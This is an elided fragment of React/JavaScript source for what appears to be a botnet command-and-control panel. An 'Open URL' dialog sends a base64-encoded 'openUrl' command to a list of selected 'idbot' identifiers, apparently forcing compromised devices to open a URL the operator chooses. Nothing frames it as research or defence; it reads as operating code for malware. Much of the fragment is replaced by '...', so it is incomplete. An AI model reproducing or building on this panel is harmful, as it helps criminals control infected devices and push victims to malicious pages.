        ...
        let request = $.ajax({
            ...
            data: {
                'params': new Buffer(
                    ...
                    '"idbot":"' + selected.join(',') + '",' + 
                    '"command":"' + new Buffer('{"name":"openUrl","url":"' + url + '"}').toString('base64') + '"' + 
            ...
            <DialogContent dividers>
                ...
                >
                    <SvgIcon fontSize="medium">
                        ...
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Open URL</Typography>
                    ...
                    <TextField placeholder='https://google.com' onChange={()=> seturl(event.target.value)} sx={{mt: 3}} id="outlined-basic" label="URL" variant="outlined" fullWidth/>

                    <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                    <Button onClick={()=> {if (url != '') { SendCommand(url); setOpenPopup(false);  seturl(''); toast.success("Send command to open " + url)} else { toast.error("You need to enter a url before performing this action"); } }} sx={{mt: 3, width: 115, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPaperPlane} /></SvgIcon>)}variant="contained">Send</Button>
                    </div>
            </DialogContent>
        </Dialog>
    )
